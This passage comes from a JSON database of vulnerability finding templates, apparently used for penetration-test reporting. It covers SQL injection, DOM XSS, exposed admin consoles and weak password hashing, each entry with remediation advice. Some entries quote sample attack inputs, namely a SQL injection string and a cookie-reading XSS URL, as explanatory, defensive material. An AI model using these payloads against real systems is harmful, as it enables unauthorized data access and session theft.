applications.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":492,"plugin_id":null,"title":"Passwords Stored Using Cryptographically Weak Hash","type":null,"description":"User passwords are stored in the user database using a cryptographically weak hashing algorithm. Although hash values are not supposed to be reversible (pre-image resistance), certain older hashing algorithms have been proven to contain known collisions - different inputs that yield the same hash value. Multiple collision attacks exist that can generate the same hash value using different pieces of clear text input data.\n","poc":null,"impact":"Passwords stored using cryptographically weak hashes may be reversed, exposing stored passwords. If an attacker gains access to the user database, user credentials will be directly exposed, allowing the attacker to impersonate legitimate users. The attacker could obtain sensitive information, modify or insert new data, or perform any other actions available to legitimate users. The impact of such unauthorized access to data and functionality cannot be overstated and may include data loss, large scale failure, or inaccuracies in data. This will in turn affect the business goals of availability, integrity, and confidentiality.\nAn attacker may be able to gain access to the application database in several ways. If an attacker discovers a SQL injection flaw in the application that allows them even read-only access, every user's credentials may be exposed. If the application is free of vulnerabilities that expose database information to the attacker through the web application, a potential threat still exists when an insider with access to the database retrieves other users' credentials. For example, an un-authorized database administrator could simply read credentials from the database and access the application as a valid application user. An outsider may also be able to obtain access to backup tapes or discarded hard discs containing database information which would in turn expose clear-text user credentials.\n","remediation":"For defense-in-depth, passwords should be salted and hashed to prevent an attacker from gaining access to clear-text passwords in the event that the database table containing user passwords is compromised. The first step toward securely storing passwords involves generating a random, fixed-length token (or \"salt\") when the clear-text password is about to be stored in the database:\n<pre><code class=\"dart\">SALT = rand( 64Bytes ) </pre>\nThe salt value and clear-text password should then be combined and hashed using a cryptographically secure hashing algorithm such as SHA-256. The concatenated password and salt can also be stored using an HMAC that utilizes SHA256.\n<pre><code class=\"dart\">OUT = HMAC_SHA256( KEY, CONCAT( PW, SALT )  ) + \":\" + SALT </pre>\nOnce the password is salted and hashed, the hash and plaintext salt can be stored in the database alongside the username. Alternatively, the password can be stored using a key derivation function for passwords. A key derivation function derives one or more secret keys from a secret value such as a master key or other known information such as a password or passphrase using a pseudo-random function. Three examples include pbkdf2, bcrypt, or scrypt. In this case, developers must specify a \"work factor\" for the function. This parameter's value will change depending on the chosen function but should be tuned to execute in 1/100th of a second (lower/higher depending on peak user load requirements) in the production environment.\nNote: once passwords are salted and hashed in the database, any functionality which involves user credentials will need to be modified to account for the change in how passwords are stored. When a user logs in, the application will need to take the supplied clear-text password, combine it with the salt stored in the database, hash the combination and compare the resulting hash with the hash stored for that user. If the hashes match, the supplied password matches the one the user submitted initially.\nFor more information, consult the OWASP Password Storage Cheat Sheet:\nhttps://www.owasp.org/index.php/Password_Storage_Cheat_Sheet\n","cvss_base_score":5.7,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:S/C:C/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":493,"plugin_id":null,"title":"Unprotected phpMyAdmin interface","type":null,"description":"phpMyAdmin is configured to not require authentication. Remote unauthenticated attackers can view and edit the databases, and may read/write arbitrary files depending on the MySQL configuration.\n","poc":null,"impact":"Remote unauthenticated attackers can view and edit the databases, and may read/write arbitrary files depending on the MySQL configuration.\n","remediation":"Define Authentication Method in 'config.inc.php'\nEdit the config.inc.php file and change 'auth_type' to either 'http' or 'cookie'. Alternatively the default value 'config' can be kept, but a MySQL password must be defined.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":494,"plugin_id":null,"title":"IIS Default Installation Page Pattern Found","type":null,"description":"We detected a default IIS server installation page. The presence of an IIS default page indicates that the server is likely to be in its default configuration. In addition, it may indicate that the server is rarely monitored and poorly maintained, making it easier for an attacker to exploit existing vulnerabilities.\n","poc":null,"impact":"It may indicate that the server is rarely monitored and poorly maintained, making it easier for an attacker to exploit existing vulnerabilities.\n","remediation":"Delete the default IIS installation page. Make sure IIS is fully patched.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":495,"plugin_id":null,"title":"Digest Authorization Required","type":null,"description":"We identified a resource that requires Digest Authentication.\n","poc":null,"impact":"This issue is reported as extra information, there is no direct impact resulting from this issue.\n","remediation":"Disable digest authentication.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":496,"plugin_id":null,"title":"MySQL root user blank password","type":null,"description":"It is possible to connect to the remote MySQL database server using an unpassworded account. This may allow an attacker to launch further attacks against the database.\n","poc":null,"impact":"The successful attacker will have all access rights of that database user and may be able to read, add or modify records.\n","remediation":"Disable or set a password for the affected account.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":497,"plugin_id":null,"title":"Failure to Control Generation of Code (&#039;Code Injection&#039;)","type":null,"description":"We identified a remote code evaluation,which occurs when input data is run as code.This is a highly critical issue and should be addressed as soon as possible.\n","poc":null,"impact":"An attacker can execute arbitrary ASP code on the system. The attacker may also be able to execute arbitrary system commands.\n","remediation":"Do not accept input from end users which will be directly interpreted as source code. If this is a business requirement, validate all input to the application by removing any data that could be directly interpreted as ASP source code.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":498,"plugin_id":null,"title":"Direct Access To Administration Pages","type":null,"description":"The web application provides unauthenticated access to administration pages. These pages are designed to perform the initial configuration and maintenance of the web application. Administration pages can contain a wide variety of functionality including the ability to add and remove users, change account passwords, run batch jobs, and view application logs.\n","poc":null,"impact":"Granting direct access to administration pages may result in an attacker gaining escalated privileges within the application. Administration pages that are publicly reachable can provide an attacker direct access to critical application functionality, increasing the potential impact and likelihood of attack. Depending on the functionality available an attacker could perform a denial of service on the application, or gain access to sensitive information.\n","remediation":"Configure the web application to require authentication and enforce access controls on administration pages. Entitlements for end users and administrators should be explicitly defined, restricting access to administration pages appropriately. Furthermore, access to administration pages should be restricted to internal IP addresses only. This can be achieved either through examination of a user's IP address or by isolating administration interfaces on a separate internal server.\n","cvss_base_score":7.8,"cvss_temporal_score":6.1,"cvss_vector":"(AV:N/AC:L/Au:N/C:C/I:N/A:N/E:POC/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":499,"plugin_id":null,"title":"HTML Comments Sensitive Information Disclosure","type":null,"description":"The application discloses sensitive information through HTML comments. Information disclosure through HTML comments occurs when developers fail to remove sensitive data from comments before transferring new code to production systems. These comments can contain information such as development notes, test data, environment details, credentials, etc.\n","poc":null,"impact":"Sensitive information exposed in HTML comments may provide an attacker with the means to more efficiently target various attacks against the application. Leaked credentials and test URLs may provide an attacker with direct, unauthorized access to application resources and functionality. Developer notes and server configuration information may allow an attacker to more efficiently target published or customized attacks against the server.\n","remediation":"All HTML comments must be removed from HTTP responses that are sent to the client by the server. This can be accomplished programmatically, at runtime via regular expressions, or via automated tools such as Google PageSpeed, HTML Compressor, JTidyServlet, etc.\n","cvss_base_score":2.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":500,"plugin_id":null,"title":"Exposure of CVS Repository to an Unauthorized Control Sphere","type":null,"description":"We discovered a CVS repository file.\n","poc":null,"impact":"CVS Repository files can disclose the CVS physical path, CVS name and CVS file list. While disclosures of this type do not provide chances of direct attack, they can be useful for an attacker when combined with other vulnerabilities or during the exploitation of some other vulnerabilities.\n","remediation":"Do not leave CVS Repository files on development environments. If there is a business requirement to do so, implement access control mechanisms to stop public access to CVS Repository files.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":501,"plugin_id":null,"title":"Adobe Flash permissive crossdomain.xml policy","type":null,"description":"Permissive crossdomain.xml policy files allow external Adobe Flash (SWF) scripts to interact with your website.\nDepending on how authorization is restricted on your website, this could inadvertently expose data to other domains or allow invocation of functionality across domains. The cross-domain policy file should permit only domains that can be trusted to make requests that include the user's domain-specific cookies.\n","poc":null,"impact":"Permissive crossdomain.xml policy files allow external Adobe Flash (SWF) scripts to interact with your website.\n","remediation":"Edit the crossdomain.xml file to be less permissive\nEdit the crossdomain.xml file, ensuring:\nNo 'site-control' tags have the \"permitted-cross-domain-ploicies\" set to \"all\"\nNo 'allow-access-from' tags have the 'domain' attribute set to '*' or '*.TLD'\nNo 'allow-access-from' tags have the 'secure' attribute set to 'false'\nNo 'allow-http-headers-from' tags have the 'domain' attribute set to '*' or '*.TLD'\nNo 'allow-http-headers-from' tags have the 'secure' attribute set to 'false'\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":502,"plugin_id":null,"title":"JBoss JMX Console Unrestricted Access","type":null,"description":"The remote web server appears to be a version of JBoss that allows unauthenticated access to the JMX and/or Web Console servlets used to manage JBoss and its services. A remote attacker can leverage this issue to disclose sensitive information about the affected application or even take control of it.\n","poc":null,"impact":"The default configuration of JBoss does not restrict access to the (1) console and (2) web management interfaces, which allows remote attackers to bypass authentication and gain administrative access via direct requests.\n","remediation":"Enable Password Authentication for JBoss\nDownload and apply the upgrade from: http://wiki.jboss.org/wiki/Wiki.jsp?page=SecureTheJmxConsole\nFor more information see the JBoss website.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":503,"plugin_id":null,"title":"SQL Injection","type":null,"description":"The application executes SQL queries generated by dynamically concatenating user-supplied data to static SQL query strings. In this implementation, the database has no way of distinguishing between the developer's intended SQL syntax and any SQL syntax included from user-supplied input. As a result, any user-supplied data containing SQL syntax inserted into the static query will be interpreted and executed. This leaves the application vulnerable to SQL injection since an attacker can inject SQL query syntax that intentionally alters the target query's structure.\nConsider the following sample code which dynamically generates an SQL query by concatenating user-supplied data (the username parameter) as the value in the WHERE clause of an SQL SELECT statement:\n<pre><code class=\"java\">String username = request.getParameter(\"username\"); String query = \"SELECT * FROM Users U WHERE U.User = '\" + username + \"'\"; </pre>\nThis code is designed to take a user's username (e.g. \"AppUser1\") and retrieve the data from that row in the users table by executing the following SQL query:\n<pre><code class=\"sql\">SELECT * FROM Users U WHERE U.User = 'AppUser1'; </pre>\nAn attacker can submit the following username value to alter the query's execution:\n<pre><code class=\"dart\">AppUser1' OR 'a'='a </pre>\nThe dynamic SQL query sent to the database becomes:\n<pre><code class=\"sql\"> SELECT * FROM Users WHERE user = 'AppUser1' OR 'a'='a'; </pre>\nThe addition of the OR 'a'='a' condition causes the WHERE clause to always evaluate to true, so the SELECT statement returns all rows in the Users table.\n","poc":null,"impact":"SQL injection allows an attacker to modify the structure of a SQL query executed by the application. Depending on the type of SQL server in use, the attacker may be able to modify existing queries or append entirely new queries to the existing query. The modified query can access any portion of the database with the same entitlements that the database connection is granted, potentially leading to:\n--Loss of confidentiality when an attacker gains access to unauthorized information\n--Loss of integrity through modification of other users' information, log files, and any other sensitive information\n--Loss of availability when an attacker deletes other users' data, executes commands that take down the database server, or performs a denial of service attack that fills the database and subsequently exhausts the database server's storage\n--Authentication bypass through modification of SQL queries that verify a user's credentials\n--Authorization bypass from gaining access to or altering data in ways the application's business logic does not allow\n\n","remediation":"Rewrite all SQL queries constructed through dynamic concatenation to use an injection-safe query mechanism such as prepared statements with parameterized queries. Most modern programming languages provide a feature called \"parameterized queries\" that allow user-supplied data to be inserted safely as values in dynamic SQL queries. Rather than construct the dynamic SQL query by concatenating user-supplied data to static SQL query string fragments, data values are identified in the query by parameter markers or variables. Dynamic data is then passed through a mechanism provided by SQL that prevents the supplied data from changing the meaning of the query.\nNote: the exact syntax and use of prepared statements with parameterized queries varies from language to language. The following links provide general guidance for secure SQL query construction in .NET, Java, and PHP:\nhttps://msdn.microsoft.com/en-us/library/bb738521(v=vs.100).aspx\nhttps://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html\nhttp://php.net/manual/en/mysqli.prepare.php\n","cvss_base_score":7.5,"cvss_temporal_score":6.5,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:P/A:P/E:H/RL:OF/RC:C/CDP:H/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Critical","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":504,"plugin_id":null,"title":"HTTP SAP ICF &#039;sap public info&#039; Service Sensitive Information Gathering","type":null,"description":"During our assessment we found that one of the SAP ICF service url exposing sensitive information about the SAP platform,can be accessed anonymously through the /sap/public/info.\n","poc":null,"impact":"This is responsible for remote information disclosure attack against SAP Internet Communication Framework (ICF) to obtain the operating system version, SAP version, IP address and other information.\n","remediation":"Ensure that ICF urls containing critical system information, are not exposed to the end users without authentication.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":505,"plugin_id":null,"title":"Default Installation Page Found","type":null,"description":"During crawling of the target application we discovered one link containing a default installation page.\n","poc":null,"impact":"Default installation pages can reveal sensitive information like exact versions of the underlying components,configuration settings etc.This information might help an attacker to launch further attacks on the specific version of the software installed.\n","remediation":"Ensure that no default or installation page remains inside the webroot of the production environment.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":506,"plugin_id":null,"title":"Password Aging with Long Expiration","type":null,"description":"Just as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked. Passwords must be given a maximum life span, after which a user is required to update with a new and different password.\n","poc":null,"impact":"Allowing password aging to occur unchecked can result in the possibility of diminished password integrity.\n","remediation":"Ensure that password aging is limited so that there is a defined maximum age for passwords and so that the user is notified several times leading up to the password expiration.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":507,"plugin_id":null,"title":"SharePoint Exposed Web Services","type":null,"description":"During our assessment we found some webservice end points.\n","poc":null,"impact":"Exposed web service end points present new classes of threats and hence needs to be protected with proper authorization.\n","remediation":"Exposed web service end points present new classes of threats and hence needs to be protected with proper authorization.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":508,"plugin_id":null,"title":"Uploaded files are saved in the same web context as the application","type":null,"description":"Files should either go to the content server or the database\n","poc":null,"impact":"File Management Logical Bugs\nATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","remediation":"File Management Logical Bugs\nATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":509,"plugin_id":null,"title":"DOM Based Cross-Site Scripting","type":null,"description":"The website or application is vulnerable to DOM-based cross-site-scripting (XSS). Cross-site scripting allows a malicious attacker to trick your web application into emitting the JavaScript or HTML code of his choice. This malicious code will appear to come from your web application when it runs in the browser of an unsuspecting user.\nWhereas traditional XSS takes advantage of vulnerable back-end CGI scripts to directly emit the code into served pages, DOM-based XSS takes advantage of vulnerable JavaScript scripts which execute directly in the user's browser. For example, a the following vulnerable script can be used to launch an XSS attack:\n<pre><code class=\"javascript\">var loc = document.location + '?gotoHomepage=1'; document.write('<a href=\"' + loc + '\">Home</a>'); </pre>\nIn this case, the JavaScript variable \"document.location\" is under the direct control of an attacker, but it is being written directly into the document content without escaping. An attacker could construct a URL containing <script> tags in it and trick an unsuspecting user into visiting the vulnerable website. A URL such as http://your_application/index.html?\"><script>alert(document.cookie)</script> can be constructed that would cause the script above to write the attacker's malicious script tags directly into the user's document, where they will be executed.\nAn exploit script can be made to:\n--access other sites inside another client's private intranet.\n--steal another client's cookie(s).\n--modify another client's cookie(s).\n--steal another client's submitted form data.\n--modify another client's submitted form data (before it reaches the server).\n--submit a form to your application on the user's behalf which modifies passwords or other application data\n\n--Clicking on a URL link sent in an e-mail\n--Clicking on a URL link while visiting a website\n\n","poc":null,"impact":"The website or application is vulnerable to DOM-based cross-site-scripting (XSS). Cross-site scripting allows a malicious attacker to trick your web application into emitting the JavaScript or HTML code of his choice. This malicious code will appear to come from your web application when it runs in the browser of an unsuspecting user.\n","remediation":"Fix DOM-based Cross Site Scripting Vulnerability\nAudit all JavaScript code in use by your application to make sure that untrusted data is being escaped before being written into the document, evaluated, or sent as part of an AJAX request. There are dozens of JavaScript functions and properties which must be protected, including some which are rather non-obvious:\n--The document.write() function\n--The document.writeln() function\n--The eval() function, which executes JavaScript code from a string\n--The execScript() function, which works similarly to eval()\n--The setInterval(), setTimeout(), and navigate() functions\n--The .innerHTML property of a DOM element\n--Certain CSS properties which allow URLs such as .style, .backgroundImage, .listStyleImage, etc.\n--The event handler properties like .onClick, which take JavaScript code as their values\n\nYou can use the JavaScript built-in functions encode() or encodeURI() to handle your escaping. If you write your own escaping functions, be extremely careful. Rather than using a \"black list\" approach (where you filter dangerous characters and pass everything else through untouched), it is better to use a \"white list\" approach. A good white list approach is to escape everything by default and allow only alphanumeric characters through.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":510,"plugin_id":null,"title":"Microsoft SharePoint User Enumeration","type":null,"description":"Microsoft SharePoint is a web application platform developed by Microsoft. Because of improper configuration a user can enumerate the SharePoint user accounts by incrementing the ID parameter of userdisp.aspx.\n","poc":null,"impact":"The SharePoint user account can disclose sensitive information. This information can be used to launch further attacks.\n","remediation":"For direct references to restricted resources, the application needs to verify the user is authorized to access the exact resource they have requested.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":511,"plugin_id":null,"title":"Bulk User Registration Allowed","type":null,"description":"During our assessment we found that the application under review does not ask new users to verify their identity through verification of their registered emailid and as a result bulk user registration is possible with non existing emailids.\nIt seems logical this mechanism would assure email validity and would deter a robot non grata, but is it pertinent for a low user functionality website, for example only for writing comments or anything relatively harmless like that, to enforce it.\n","poc":null,"impact":"Bulk user registration is possible.\n","remediation":"If you want to have an established communication channel with the user before you let them use advanced functionality, you need to validate it, but you don't need to block their access until that happens.\nif you plan on using the email as identity representation (you shouldn't, but that's a separate topic), you need to validate the email and hold on the account establishing until that happens.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:09","updated_at":"2018-11-12 09:25:09","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":512,"plugin_id":null,"title":"Dblog CMS Open Source Database Retrieval","type":null,"description":"DBlog stores all the data in JET database file with default name \"dblog.mdb\".\nThis database file is accessible from web as:\n<pre>http://www.example.com/mdb-database/dblog.mdb </pre>\nBy fetching database anyone can obtain admin password sha hashes and then try to\ncrack them and gain admin privileges.\nThere are some mitigating factors though:\n--IIS webserver can refuse \".mdb\" file download\n--database file or directory can be renamed to something else\n\n","poc":null,"impact":"By fetching database anyone can obtain admin password sha hashes and then try to\ncrack them and gain admin privileges.\nThere are some mitigating factors though:\n--IIS webserver can refuse \".mdb\" file download\n--database file or directory can be renamed to something else\n\n","remediation":"IIS directory restrictions, renaming directory and database file.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":513,"plugin_id":null,"title":"Proxmox &lt; 3.2 User enumeration vulnerability","type":null,"description":"When trying to authenticate on the Proxmox web interface, an ajax request is sent to the server with the username and password entered by the user. The server returns a message in the ajax request :\n--If the user does not exist in the server the message will be : \"no such user\"\n--If the user exist but the password is not correct the message is : \"Authentification failure\"\n\n","poc":null,"impact":"By exploiting this behavior, an attacker could experiment through trial and error (the brute force technique) to establish valid usernames for the application, before proceeding to attempt discovery of the associated password.\nThe result is an enumeration of valid usernames and passwords, which can be used by attackers to access accounts.\n","remediation":"Issue an identical error message to every false login attempt, regardless of which field the error occurred in, especially if either the username or the password fields are wrong.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":514,"plugin_id":null,"title":"No Account Lockout Policy","type":null,"description":"The application does not maintain or enforce an account lockout policy. A lockout policy refers to the mechanism that temporarily suspends a user's account after a certain number of unsuccessful authentication attempts have been made.\n","poc":null,"impact":"Applications with no lockout policy are vulnerable to brute force password guessing attacks, in which the attacker performs login attempts using a known username and a list of potential passwords until a successful combination is found. Once a successful combination is discovered, the attacker is granted full access to the compromised account, and is able to impersonate the victim without detection.\n","remediation":"Implement an account lockout policy that locks accounts for a defined period of time after a certain number of failed attempts. PCI DSS v3.2 requirements call for a lockout after no more than six (6) failed login attempts with a minimum lockout timeout of 30 minutes. During the lockout period, a single generic error message should be displayed for both valid and invalid login attempts. If the application contains highly sensitive data or functionality, it may be appropriate to require manual account reactivation via help desk.\nWhen possible, velocity checks should also be put in place to limit the number of unsuccessful login attempts made within a certain time period for a given user account or IP address. This will help protect against two scenarios:\n--Login attempts distributed over multiple accounts from the same source IP address\n--Login attempts made for one account across multiple source IP addresses\n\nNote: many of these remediation tactics will be context-specific to the application that is being protected, and as such, various combinations of the above remediation options should be considered.\n","cvss_base_score":5.4,"cvss_temporal_score":4.5,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":515,"plugin_id":null,"title":"Apache server-status Information Disclosure","type":null,"description":"The Apache server's mod_status module is enabled, leaking detailed server information to users via the server-status page. The mod_status module allows server admins to view diagnostic information and server performance. Details provided by the server-status page include, but are not limited to:\n--Apache server version\n--Loaded modules (e.g. mod_mysql, mod_php, mod_ssl)\n--Number of workers serving a request\n--CPU percentage consumed by each worker\n--Server uptime\n\n","poc":null,"impact":"Information disclosed via the Apache server-status page may allow an attacker to gain additional insight into the technologies deployed on the web server. An attacker that views the Apache server-status page can use the information available to develop more targeted attacks against the application and server.\n","remediation":"The mod_status module should be disabled in production environments. If removing the mod_status module impedes the operation of the web application, then the server should perform hostname or IP address verification to prevent the server-status page from being available publicly.\nIf the mod_status module is required the following code snippet can be used to restrict server-status access to machines with a specific hostname. In this example the hostname example.com will be added to the modified httpd.conf to ensure only that hostname has access:\n<pre><Location /server-status>     SetHandler server-status     Order deny,allow     Deny from all     Allow from example.com </Location> </pre>\nThe same can be done to restrict access according to IP address:\n<pre>Allow from 173.227.247.34 </pre>\n","cvss_base_score":5,"cvss_temporal_score":4.3,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N/E:H/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":516,"plugin_id":null,"title":"WordPress readme.html Information Disclosure","type":null,"description":"Running version of installation of the WordPress is revealed through readme.html page.\nIdentifying the version of an unhardened WordPress is straight forward. By browsing the default \"readme.html\" WordPress lets us know the current version installed.\nThis is sensitive information disclosure and such information can be used against you to hack your WordPress website or blog, especially if you are running an old and vulnerable version of WordPress. To increase WordPress security awareness, in the below section we will explain how a malicious user or hacker can easily hack a WordPress installation by using the 